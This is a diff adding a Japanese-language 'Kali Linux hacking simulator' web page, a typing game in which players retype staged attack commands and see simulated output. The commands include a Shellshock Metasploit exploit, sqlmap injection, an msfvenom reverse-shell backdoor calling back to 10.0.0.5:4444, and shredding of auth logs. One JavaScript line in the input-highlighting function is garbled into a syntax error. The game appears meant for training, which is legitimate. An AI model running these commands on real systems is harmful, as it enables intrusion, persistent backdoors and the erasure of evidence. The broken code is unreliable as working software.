@@ -1,0 +1,1334 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>カリLinux ハッキングシミュレーター</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --kali-primary: #557cf2;
+            --kali-secondary: #0a0a0a;
+            --kali-accent: #ff6b6b;
+            --kali-terminal: #1e1e1e;
+            --kali-text: #f8f8f8;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'DejaVu Sans Mono', 'Courier New', monospace;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--kali-secondary) 0%, #1a1a2e 100%);
+            color: var(--kali-text);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* カリLinux風ヘッダー */
+        .kali-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+            background: rgba(30, 30, 46, 0.95);
+            border-radius: 12px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(85, 124, 242, 0.3);
+        }
+
+        .kali-logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .kali-logo-icon {
+            color: var(--kali-primary);
+            font-size: 36px;
+            filter: drop-shadow(0 0 8px rgba(85, 124, 242, 0.7));
+        }
+
+        .kali-logo-text h1 {
+            font-size: 28px;
+            background: linear-gradient(45deg, var(--kali-primary), var(--kali-accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 1.5px;
+        }
+
+        .kali-logo-text .subtitle {
+            font-size: 12px;
+            color: #aaa;
+            letter-spacing: 3px;
+            margin-top: 2px;
+        }
+
+        .system-info {
+            display: flex;
+            gap: 25px;
+            font-size: 14px;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .info-icon {
+            color: var(--kali-primary);
+        }
+
+        /* メインコンテンツレイアウト */
+        .main-content {
+            display: flex;
+            flex: 1;
+            gap: 25px;
+            margin-bottom: 25px;
+        }
+
+        .left-column {
+            flex: 7;
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+
+        .right-column {
+            flex: 3;
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+
+        /* カリLinux風パネル */
+        .kali-panel {
+            background: rgba(30, 30, 46, 0.9);
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid rgba(85, 124, 242, 0.2);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .kali-panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(to bottom, var(--kali-primary), var(--kali-accent));
+        }
+
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(85, 124, 242, 0.3);
+        }
+
+        .panel-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--kali-primary);
+        }
+
+        .panel-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .panel-btn {
+            background: rgba(85, 124, 242, 0.1);
+            border: 1px solid rgba(85, 124, 242, 0.3);
+            color: var(--kali-primary);
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.3s;
+        }
+
+        .panel-btn:hover {
+            background: rgba(85, 124, 242, 0.3);
+        }
+
+        /* メインターミナル */
+        #main-terminal {
+            height: 400px;
+            background: var(--kali-terminal);
+            border-radius: 6px;
+            padding: 15px;
+            overflow-y: auto;
+            font-size: 14px;
+            line-height: 1.5;
+            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.8);
+        }
+
+        .terminal-line {
+            margin-bottom: 8px;
+            display: flex;
+            flex-wrap: wrap;
+        }
+
+        .terminal-prompt {
+            color: var(--kali-accent);
+            margin-right: 10px;
+            white-space: nowrap;
+        }
+
+        .terminal-command {
+            color: var(--kali-text);
+        }
+
+        .terminal-output {
+            color: #4ec9b0;
+            margin-left: 25px;
+            margin-top: 5px;
+            margin-bottom: 15px;
+        }
+
+        .terminal-error {
+            color: #f14c4c;
+        }
+
+        .terminal-success {
+            color: #4caf50;
+        }
+
+        /* コマンド入力エリア */
+        .command-input-area {
+            height: 180px;
+        }
+
+        .command-display {
+            background: rgba(10, 10, 20, 0.8);
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(85, 124, 242, 0.2);
+            min-height: 70px;
+            display: flex;
+            align-items: center;
+        }
+
+        #command-to-type {
+            font-size: 16px;
+            font-family: 'DejaVu Sans Mono', monospace;
+            color: var(--kali-text);
+            letter-spacing: 0.5px;
+            word-break: break-all;
+        }
+
+        .input-container {
+            position: relative;
+        }
+
+        #command-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            background: rgba(10, 10, 20, 0.8);
+            border: 2px solid var(--kali-primary);
+            border-radius: 6px;
+            color: var(--kali-text);
+            outline: none;
+            letter-spacing: 0.5px;
+            transition: all 0.3s;
+        }
+
+        #command-input:focus {
+            box-shadow: 0 0 15px rgba(85, 124, 242, 0.5);
+            border-color: var(--kali-accent);
+        }
+
+        .input-hint {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 12px;
+        }
+
+        /* ツールパネル */
+        .tools-panel {
+            height: 300px;
+        }
+
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .tool-item {
+            background: rgba(40, 40, 60, 0.7);
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid transparent;
+        }
+
+        .tool-item:hover {
+            transform: translateY(-3px);
+            background: rgba(85, 124, 242, 0.1);
+            border-color: var(--kali-primary);
+        }
+
+        .tool-icon {
+            font-size: 24px;
+            color: var(--kali-primary);
+            margin-bottom: 10px;
+        }
+
+        .tool-name {
+            font-size: 12px;
+            color: var(--kali-text);
+        }
+
+        .tool-active {
+            background: rgba(85, 124, 242, 0.2);
+            border-color: var(--kali-primary);
+            box-shadow: 0 0 10px rgba(85, 124, 242, 0.3);
+        }
+
+        /* ネットワークマップ */
+        .network-map {
+            height: 350px;
+            position: relative;
+        }
+
+        .network-visualization {
+            height: 250px;
+            position: relative;
+            background: rgba(10, 10, 20, 0.5);
+            border-radius: 8px;
+            margin-top: 15px;
+            overflow: hidden;
+        }
+
+        .node {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.5s;
+        }
+
+        .node-attacker {
+            background: radial-gradient(circle at 30% 30%, var(--kali-accent), #b33939);
+            color: white;
+            left: 50px;
+            top: 100px;
+            box-shadow: 0 0 20px rgba(255, 107, 107, 0.5);
+        }
+
+        .node-target {
+            background: radial-gradient(circle at 30% 30%, var(--kali-primary), #2d3a8b);
+            color: white;
+            left: 300px;
+            top: 100px;
+        }
+
+        .node-router {
+            background: radial-gradient(circle at 30% 30%, #4caf50, #2e7d32);
+            color: white;
+            left: 175px;
+            top: 50px;
+        }
+
+        .node-server {
+            background: radial-gradient(circle at 30% 30%, #ffa726, #ef6c00);
+            color: white;
+            left: 175px;
+            top: 150px;
+        }
+
+        .connection {
+            position: absolute;
+            height: 2px;
+            background: rgba(85, 124, 242, 0.5);
+            transform-origin: 0 0;
+        }
+
+        .connection-active {
+            background: var(--kali-accent);
+            box-shadow: 0 0 10px var(--kali-accent);
+        }
+
+        /* プログレスパネル */
+        .progress-panel {
+            height: 200px;
+        }
+
+        .hack-stages {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .stage-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 10px;
+            border-radius: 6px;
+            background: rgba(40, 40, 60, 0.5);
+            transition: all 0.3s;
+        }
+
+        .stage-item.active {
+            background: rgba(85, 124, 242, 0.2);
+            border-left: 3px solid var(--kali-primary);
+        }
+
+        .stage-item.completed {
+            background: rgba(76, 175, 80, 0.1);
+            border-left: 3px solid #4caf50;
+        }
+
+        .stage-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(85, 124, 242, 0.2);
+            color: var(--kali-primary);
+        }
+
+        .stage-info {
+            flex: 1;
+        }
+
+        .stage-name {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 3px;
+        }
+
+        .stage-desc {
+            font-size: 11px;
+            color: #aaa;
+        }
+
+        /* 統計パネル */
+        .stats-panel {
+            height: 150px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .stat-item {
+            background: rgba(40, 40, 60, 0.7);
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--kali-primary);
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        /* フッター */
+        .kali-footer {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid rgba(85, 124, 242, 0.3);
+            color: #aaa;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+
+        /* タイピングハイライト */
+        .char-correct {
+            color: #4caf50;
+        }
+
+        .char-incorrect {
+            color: #f14c4c;
+            text-decoration: underline;
+        }
+
+        .char-current {
+            background-color: rgba(85, 124, 242, 0.3);
+            padding: 0 2px;
+            border-radius: 2px;
+        }
+
+        /* アニメーション */
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
+        }
+
+        @keyframes scan {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* スクロールバー */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(30, 30, 46, 0.8);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--kali-primary);
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--kali-accent);
+        }
+
+        /* レスポンシブ */
+        @media (max-width: 1200px) {
+            .main-content {
+                flex-direction: column;
+            }
+            
+            .tools-grid {
+                grid-template-columns: repeat(6, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .tools-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            
+            .kali-header {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+            
+            .system-info {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- カリLinux風ヘッダー -->
+        <header class="kali-header">
+            <div class="kali-logo">
+                <i class="fas fa-dragon kali-logo-icon"></i>
+                <div class="kali-logo-text">
+                    <h1>KALI LINUX</h1>
+                    <div class="subtitle">HACKING SIMULATOR</div>
+                </div>
+            </div>
+            <div class="system-info">
+                <div class="info-item">
+                    <i class="fas fa-user-secret info-icon"></i>
+                    <span>User: root</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-desktop info-icon"></i>
+                    <span>Session: 001</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-clock info-icon"></i>
+                    <span id="current-time">00:00:00</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-wifi info-icon"></i>
+                    <span>VPN: Active</span>
+                </div>
+            </div>
+        </header>
+
+        <div class="main-content">
+            <!-- 左カラム -->
+            <div class="left-column">
+                <!-- メインターミナル -->
+                <div class="kali-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <i class="fas fa-terminal"></i>
+                            攻撃コンソール
+                        </div>
+                        <div class="panel-actions">
+                            <button class="panel-btn" id="clear-terminal">
+                                <i class="fas fa-broom"></i> クリア
+                            </button>
+                            <button class="panel-btn" id="save-log">
+                                <i class="fas fa-save"></i> 保存
+                            </button>
+                        </div>
+                    </div>
+                    <div id="main-terminal">
+                        <div class="terminal-line">
+                            <span class="terminal-prompt">root@kali:~#</span>
+                            <span class="terminal-command">カリLinux ハッキングシミュレーターにようこそ</span>
+                        </div>
+                        <div class="terminal-output">
+                            // 実際のカリLinuxツールを使用した侵入シミュレーション
+                            // 以下のコマンドを正確に入力して攻撃を開始してください
+                        </div>
+                        <div class="terminal-line">
+                            <span class="terminal-prompt">root@kali:~#</span>
+                            <span class="terminal-command">help</span>
+                        </div>
+                        <div class="terminal-output">
+                            利用可能なコマンド: nmap, metasploit, aircrack-ng, hydra, sqlmap, john, wireshark, burpsuite
+                        </div>
+                    </div>
+                </div>
+
+                <!-- コマンド入力 -->
+                <div class="kali-panel command-input-area">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <i class="fas fa-keyboard"></i>
+                            コマンド入力
+                        </div>
+                        <div class="panel-actions">
+                            <span id="current-tool">nmap</span>
+                        </div>
+                    </div>
+                    
+                    <div class="command-display">
+                        <div id="command-to-type">nmap -sV -O 192.168.1.1/24</div>
+                    </div>
+                    
+                    <div class="input-container">
+                        <input type="text" id="command-input" placeholder="上記のコマンドを入力..." autocomplete="off" autofocus>
+                        <div class="input-hint">Enterキーで実行</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 右カラム -->
+            <div class="right-column">
+                <!-- ツールパネル -->
+                <div class="kali-panel tools-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <i class="fas fa-tools"></i>
+                            カリLinuxツール
+                        </div>
+                    </div>
+                    <div class="tools-grid" id="tools-grid">
+                        <!-- ツールはJavaScriptで動的に追加 -->
+                    </div>
+                </div>
+
+                <!-- ネットワークマップ -->
+                <div class="kali-panel network-map">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <i class="fas fa-network-wired"></i>
+                            ネットワークマップ
+                        </div>
+                    </div>
+                    <div class="network-visualization" id="network-map">
+                        <!-- ネットワークノードはJavaScriptで追加 -->
+                    </div>
+                </div>
+
+                <!-- 進行状況 -->
+                <div class="kali-panel progress-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <i class="fas fa-tasks"></i>
+                            攻撃進行状況
+                        </div>
+                    </div>
+                    <div class="hack-stages" id="hack-stages">
+                        <!-- ステージはJavaScriptで追加 -->
+                    </div>
+                </div>
+
+                <!-- 統計 -->
+                <div class="kali-panel stats-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <i class="fas fa-chart-line"></i>
+                            統計
+                        </div>
+                    </div>
+                    <div class="stats-grid">
+                        <div class="stat-item">
+                            <div class="stat-value" id="accuracy">100%</div>
+                            <div class="stat-label">正確率</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-value" id="wpm">0</div>
+                            <div class="stat-label">WPM</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-value" id="commands">0</div>
+                            <div class="stat-label">実行コマンド</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-value" id="stage">1/5</div>
+                            <div class="stat-label">ステージ</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- フッター -->
+        <footer class="kali-footer">
+            <p>カリLinux ハッキングシミュレーター - 教育目的のみに使用してください</p>
+            <p>実際のシステムへの不正アクセスは法律で禁止されています</p>
+            <p>© 2023 Offensive Security - Kali LinuxはOffensive Securityの商標です</p>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // ゲーム状態
+            const gameState = {
+                currentStage: 0,
+                currentCommand: 0,
+                commandsTyped: 0,
+                correctCommands: 0,
+                startTime: Date.now(),
+                activeTool: 'nmap',
+                networkConnections: [],
+                tools: [
+                    { id: 'nmap', name: 'Nmap', icon: 'fa-search', desc: 'ネットワークスキャナー' },
+                    { id: 'metasploit', name: 'Metasploit', icon: 'fa-bomb', desc: 'エクスプロイトフレームワーク' },
+                    { id: 'aircrack', name: 'Aircrack-ng', icon: 'fa-wifi', desc: 'WiFiクラッキング' },
+                    { id: 'hydra', name: 'Hydra', icon: 'fa-key', desc: 'パスワードクラッキング' },
+                    { id: 'sqlmap', name: 'SQLmap', icon: 'fa-database', desc: 'SQLインジェクション' },
+                    { id: 'john', name: 'John', icon: 'fa-user-lock', desc: 'パスワードクラッキング' },
+                    { id: 'wireshark', name: 'Wireshark', icon: 'fa-eye', desc: 'パケット解析' },
+                    { id: 'burpsuite', name: 'Burp Suite', icon: 'fa-bug', desc: 'Web脆弱性スキャナー' },
+                    { id: 'nikto', name: 'Nikto', icon: 'fa-shield-alt', desc: 'Webサーバースキャナー' },
+                    { id: 'skipfish', name: 'Skipfish', icon: 'fa-fish', desc: 'Webアプリスキャナー' },
+                    { id: 'maltego', name: 'Maltego', icon: 'fa-sitemap', desc: 'OSINTツール' },
+                    { id: 'ettercap', name: 'Ettercap', icon: 'fa-user-ninja', desc: 'MITM攻撃' }
+                ],
+                stages: [
+                    {
+                        name: "偵察と情報収集",
+                        desc: "ターゲットの情報収集とマッピング",
+                        commands: [
+                            "nmap -sV -O 192.168.1.1/24",
+                            "maltego --target=example.com",
+                            "theharvester -d example.com -l 100 -b all"
+                        ]
+                    },
+                    {
+                        name: "脆弱性スキャン",
+                        desc: "システムの脆弱性を特定",
+                        commands: [
+                            "nikto -h http://192.168.1.100",
+                            "nessus --target 192.168.1.100",
+                            "openvas --scan 192.168.1.100"
+                        ]
+                    },
+                    {
+                        name: "エクスプロイト",
+                        desc: "脆弱性を利用してアクセスを取得",
+                        commands: [
+                            "msfconsole -q -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS 192.168.1.100; exploit'",
+                            "sqlmap -u 'http://192.168.1.100/login.php' --data='username=admin&password=pass' --dbs"
+                        ]
+                    },
+                    {
+                        name: "権限昇格",
+                        desc: "管理者権限の取得",
+                        commands: [
+                            "searchsploit linux kernel 5.4",
+                            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+                            "find / -perm -4000 -type f 2>/dev/null"
+                        ]
+                    },
+                    {
+                        name: "永続化と痕跡消去",
+                        desc: "アクセスの維持と痕跡の消去",
+                        commands: [
+                            "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf > backdoor.elf",
+                            "chmod +x backdoor.elf && ./backdoor.elf",
+                            "shred -z -u /var/log/auth.log"
+                        ]
+                    }
+                ]
+            };
+
+            // DOM要素
+            const terminal = document.getElementById('main-terminal');
+            const commandToType = document.getElementById('command-to-type');
+            const commandInput = document.getElementById('command-input');
+            const toolsGrid = document.getElementById('tools-grid');
+            const networkMap = document.getElementById('network-map');
+            const hackStages = document.getElementById('hack-stages');
+            const accuracyElement = document.getElementById('accuracy');
+            const wpmElement = document.getElementById('wpm');
+            const commandsElement = document.getElementById('commands');
+            const stageElement = document.getElementById('stage');
+            const currentToolElement = document.getElementById('current-tool');
+            const currentTimeElement = document.getElementById('current-time');
+
+            // ゲームの初期化
+            function initGame() {
+                // ツールグリッドの初期化
+                initToolsGrid();
+                
+                // ネットワークマップの初期化
+                initNetworkMap();
+                
+                // ステージ表示の初期化
+                initStages();
+                
+                // コマンド表示の更新
+                updateCommandDisplay();
+                
+                // 入力イベントの設定
+                setupInputEvents();
+                
+                // 時間表示の更新
+                updateTime();
+                setInterval(updateTime, 1000);
+                
+                // 初期メッセージ
+                addTerminalMessage("root@kali:~#", "whoami", "command");
+                addTerminalMessage("", "root", "output");
+                addTerminalMessage("root@kali:~#", "ip addr show", "command");
+                addTerminalMessage("", "eth0: 10.0.0.5/24", "output");
+                addTerminalMessage("", "VPN接続が確立されました。ターゲット: 192.168.1.0/24", "terminal-success");
+            }
+
+            // ツールグリッドの初期化
+            function initToolsGrid() {
+                toolsGrid.innerHTML = '';
+                gameState.tools.forEach(tool => {
+                    const toolElement = document.createElement('div');
+                    toolElement.className = `tool-item ${tool.id === gameState.activeTool ? 'tool-active' : ''}`;
+                    toolElement.dataset.tool = tool.id;
+                    toolElement.innerHTML = `
+                        <i class="fas ${tool.icon} tool-icon"></i>
+                        <div class="tool-name">${tool.name}</div>
+                    `;
+                    toolElement.addEventListener('click', () => selectTool(tool.id));
+                    toolsGrid.appendChild(toolElement);
+                });
+            }
+
+            // ツールの選択
+            function selectTool(toolId) {
+                gameState.activeTool = toolId;
+                currentToolElement.textContent = toolId;
+                
+                // アクティブなツールのハイライト
+                document.querySelectorAll('.tool-item').forEach(item => {
+                    item.classList.remove('tool-active');
+                    if (item.dataset.tool === toolId) {
+                        item.classList.add('tool-active');
+                    }
+                });
+                
+                addTerminalMessage("root@kali:~#", `選択したツール: ${toolId}`, "terminal-success");
+            }
+
+            // ネットワークマップの初期化
+            function initNetworkMap() {
+                networkMap.innerHTML = '';
+                
+                // ネットワークノードの作成
+                const nodes = [
+                    { id: 'attacker', type: 'attacker', x: 50, y: 100, label: '攻撃者' },
+                    { id: 'router', type: 'router', x: 175, y: 50, label: 'ルーター' },
+                    { id: 'server', type: 'server', x: 175, y: 150, label: 'Webサーバー' },
+                    { id: 'target', type: 'target', x: 300, y: 100, label: 'ターゲット' }
+                ];
+                
+                nodes.forEach(node => {
+                    const nodeElement = document.createElement('div');
+                    nodeElement.id = `node-${node.id}`;
+                    nodeElement.className = `node node-${node.type}`;
+                    nodeElement.style.left = `${node.x}px`;
+                    nodeElement.style.top = `${node.y}px`;
+                    nodeElement.innerHTML = `<i class="fas fa-${getNodeIcon(node.type)}"></i>`;
+                    nodeElement.title = node.label;
+                    networkMap.appendChild(nodeElement);
+                });
+                
+                // 接続の作成
+                const connections = [
+                    { from: 'attacker', to: 'router' },
+                    { from: 'router', to: 'server' },
+                    { from: 'router', to: 'target' }
+                ];
+                
+                gameState.networkConnections = connections;
+                updateConnections();
+            }
+
+            // 接続の更新
+            function updateConnections() {
+                // 既存の接続を削除
+                document.querySelectorAll('.connection').forEach(conn => conn.remove());
+                
+                gameState.networkConnections.forEach(conn => {
+                    const fromNode = document.getElementById(`node-${conn.from}`);
+                    const toNode = document.getElementById(`node-${conn.to}`);
+                    
+                    if (fromNode && toNode) {
+                        const fromRect = fromNode.getBoundingClientRect();
+                        const toRect = toNode.getBoundingClientRect();
+                        const mapRect = networkMap.getBoundingClientRect();
+                        
+                        const x1 = fromRect.left - mapRect.left + 25;
+                        const y1 = fromRect.top - mapRect.top + 25;
+                        const x2 = toRect.left - mapRect.left + 25;
+                        const y2 = toRect.top - mapRect.top + 25;
+                        
+                        const length = Math.sqrt(Math.pow(x2 - x1, 2) + Math.pow(y2 - y1, 2));
+                        const angle = Math.atan2(y2 - y1, x2 - x1) * 180 / Math.PI;
+                        
+                        const connection = document.createElement('div');
+                        connection.className = `connection ${conn.active ? 'connection-active' : ''}`;
+                        connection.style.width = `${length}px`;
+                        connection.style.left = `${x1}px`;
+                        connection.style.top = `${y1}px`;
+                        connection.style.transform = `rotate(${angle}deg)`;
+                        
+                        networkMap.appendChild(connection);
+                    }
+                });
+            }
+
+            // ノードアイコンの取得
+            function getNodeIcon(type) {
+                switch(type) {
+                    case 'attacker': return 'user-secret';
+                    case 'router': return 'router';
+                    case 'server': return 'server';
+                    case 'target': return 'bullseye';
+                    default: return 'desktop';
+                }
+            }
+
+            // ステージ表示の初期化
+            function initStages() {
+                hackStages.innerHTML = '';
+                gameState.stages.forEach((stage, index) => {
+                    const stageElement = document.createElement('div');
+                    stageElement.className = `stage-item ${index === gameState.currentStage ? 'active' : ''} ${index < gameState.currentStage ? 'completed' : ''}`;
+                    stageElement.innerHTML = `
+                        <div class="stage-icon">
+                            <i class="fas ${getStageIcon(index)}"></i>
+                        </div>
+                        <div class="stage-info">
+                            <div class="stage-name">${stage.name}</div>
+                            <div class="stage-desc">${stage.desc}</div>
+                        </div>
+                    `;
+                    hackStages.appendChild(stageElement);
+                });
+            }
+
+            // ステージアイコンの取得
+            function getStageIcon(index) {
+                const icons = ['fa-search', 'fa-bug', 'fa-door-open', 'fa-user-shield', 'fa-flag'];
+                return icons[index] || 'fa-circle';
+            }
+
+            // 入力イベントの設定
+            function setupInputEvents() {
+                commandInput.addEventListener('input', handleCommandInput);
+                commandInput.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter') {
+                        checkCommand();
+                    }
+                });
+                
+                // クリアボタン
+                document.getElementById('clear-terminal').addEventListener('click', () => {
+                    terminal.innerHTML = '';
+                    addTerminalMessage("", "ターミナルをクリアしました", "terminal-success");
+                });
+                
+                // 保存ボタン
+                document.getElementById('save-log').addEventListener('click', () => {
+                    addTerminalMessage("root@kali:~#", "ログを保存しました: /root/hack_log.txt", "terminal-success");
+                });
+            }
+
+            // コマンド入力の処理
+            function handleCommandInput() {
+                const currentCommand = gameState.stages[gameState.currentStage].commands[gameState.currentCommand];
+                const input = commandInput.value;
+                
+                let highlighted = '';
+                for (let i = 0; i < currentCommand.length; i++) {
+                    let charClass = '';
+                    if (i < input.length) {
+                        charClass = input[i] === currentCommand[i] ? 'char-correct' : 'char                        } else {
+                        if (i === input.length) {
+                            charClass = 'char-current';
+                        }
+                    }
+                    highlighted += `<span class="${charClass}">${currentCommand[i]}</span>`;
+                }
+                
+                commandToType.innerHTML = highlighted;
+            }
+
+            // コマンドのチェック
+            function checkCommand() {
+                const currentStage = gameState.stages[gameState.currentStage];
+                const currentCommand = currentStage.commands[gameState.currentCommand];
+                const input = commandInput.value;
+                
+                // コンソールに入力を表示
+                addTerminalMessage("root@kali:~#", input, "command");
+                
+                if (input === currentCommand) {
+                    gameState.correctCommands++;
+                    
+                    // コマンド出力を表示
+                    const output = getCommandOutput(currentCommand);
+                    addTerminalMessage("", output, "terminal-success");
+                    
+                    // ネットワーク接続をアクティブ化
+                    activateNetworkConnection();
+                    
+                    // 統計を更新
+                    updateStats();
+                    
+                    // 次のコマンドへ
+                    gameState.currentCommand++;
+                    gameState.commandsTyped++;
+                    
+                    if (gameState.currentCommand >= currentStage.commands.length) {
+                        // ステージ完了
+                        completeCurrentStage();
+                    } else {
+                        updateCommandDisplay();
+                    }
+                } else {
+                    addTerminalMessage("", "エラー: コマンドが正しくありません。再試行してください。", "terminal-error");
+                    gameState.commandsTyped++;
+                    updateStats();
+                }
+                
+                commandInput.value = '';
+            }
+
+            // コマンドの出力を生成
+            function getCommandOutput(command) {
+                const outputs = {
+                    "nmap -sV -O 192.168.1.1/24": 
+`Nmap scan report for 192.168.1.1
+Host is up (0.023s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.9p1
+80/tcp   open  http        Apache httpd 2.4.38
+443/tcp  open  ssl/https   Apache httpd 2.4.38
+MAC Address: 00:1A:2B:3C:4D:5E (Router Manufacturer)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6`,
+
+                    "maltego --target=example.com":
+`[+] Maltego Transform Discovery
+[+] Domain: example.com
+[+] IP Addresses: 192.168.1.100, 192.168.1.101
+[+] Nameservers: ns1.example.com, ns2.example.com
+[+] MX Records: mail.example.com
+[+] Subdomains: www, mail, admin, test, dev
+[+] Technologies: Apache 2.4.38, PHP 7.4, WordPress 5.8
+[+] Email Addresses: admin@example.com, webmaster@example.com`,
+
+                    "nikto -h http://192.168.1.100":
+`- Nikto v2.1.6
+- Target IP: 192.168.1.100
+- Target Hostname: webserver.local
+- Target Port: 80
+- Start Time: 2023-10-05 12:00:00
+
++ Server: Apache/2.4.38 (Debian)
++ Retrieved x-powered-by header: PHP/7.4.3
++ OSVDB-3092: /admin/: This might be interesting...
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /phpinfo.php: Contains PHP configuration information
++ OSVDB-0: /test/: Test page found.
++ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host`,
+
+                    "msfconsole -q -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS 192.168.1.100; exploit'":
+`[*] Started reverse TCP handler on 10.0.0.5:4444 
+[*] Sending stage (3012516 bytes) to 192.168.1.100
+[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 192.168.1.100:45234)
+meterpreter > getuid
+Server username: www-data
+meterpreter > sysinfo
+Computer    : webserver
+OS          : Linux webserver 5.10.0-8-amd64
+Architecture: x64
+meterpreter >`,
+
+                    "python -c 'import pty; pty.spawn(\"/bin/bash\")'":
+`www-data@webserver:/var/www/html$ whoami
+www-data
+www-data@webserver:/var/www/html$ sudo -l
+[sudo] password for www-data: 
+www-data@webserver:/var/www/html$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/su`,
+
+                    "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf > backdoor.elf":
+`Payload size: 207 bytes
+Final size of elf file: 235 bytes
+Saved as: backdoor.elf
+
